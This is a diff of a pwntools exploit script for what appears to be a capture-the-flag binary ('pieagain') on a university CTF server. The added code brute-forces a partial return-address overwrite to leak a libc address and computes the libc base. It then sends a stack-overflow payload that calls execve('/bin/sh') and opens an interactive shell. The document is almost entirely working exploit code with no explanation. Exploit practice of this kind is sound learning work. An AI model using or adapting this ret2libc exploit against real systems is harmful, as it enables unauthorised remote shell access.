@@ -2,40 +2,12 @@ from pwn import *
 from random import choice
 
 
-
-def penetrate(io, base, elf):
-    rep = 0x2c
-    io.sendline('jyh')
-    print(io.recvline())
-    print(io.recvline())
-    write = elf.plt['write']
-    payload = b'A'*rep + b'\xDE' + bytes([base*16 + 8])
-    print(payload)
-    io.sendline(payload)
-    print(io.recvline())
-    ...
-
-
 elf = ELF('./pieagain')
 
-# io = remote("pwn1.0ops.sjtu.cn", 10008)
-
-# print(io.recvline())
-
-# io.send(b"A"*31)
+libc = ELF('libc6_2.23-0ubuntu11.2_i386.so')
 
 rep = 0x2c
 
-# print(io.recvline())
-
-# payload = b'A'*rep + b'\xDE\x08' 
-
-# io.sendline(payload)
-
-# print(io.recvline())
-
-
-# print(io.recvall())
 # exit(1)
 while True:
     io = remote("pwn1.0ops.sjtu.cn", 10008)
@@ -44,16 +16,30 @@ while True:
     io.recvline()
     print(io.recvline())
     b = choice([i for i in range(16)])
-    payload = b'A'*rep + b'\xDE\x08' # + bytes([b*16 + 8]) # 0x{b}863 is the start address of rtn
+    payload = b'A'*rep + b'\xde\x08' # 0x8de is the start address of write call
     io.sendline(payload)
     try:
         io.recv(4)
-        addr = io.recv(4)
-        print(hex(u32(addr))) # return address of main function, which is in _libc_start_main function
+        addr = io.recv(4) # return address of main function, which is in _libc_start_main function
+        # print(hex(u32(addr))) 
         break
     except:
         continue
 
-# penetrate(io, b, elf) 
+_libc_start_main = u32(addr) - 247 # offset of __libc_start_main address and return address of main
 
-# io.interactive()
+
+print(hex(_libc_start_main))
+
+libc_base = _libc_start_main - libc.symbols['__libc_start_main']
+
+execve = libc.symbols['execve'] + libc_base
+bin_sh = next(libc.search(b'/bin/sh\x00')) + libc_base
+
+payload = b'A' * rep + p32(execve) + p32(0) + p32(bin_sh) + p32(0) + p32(0)
+
+io.sendline(payload)
+
+io.clean()
+
+io.interactive()
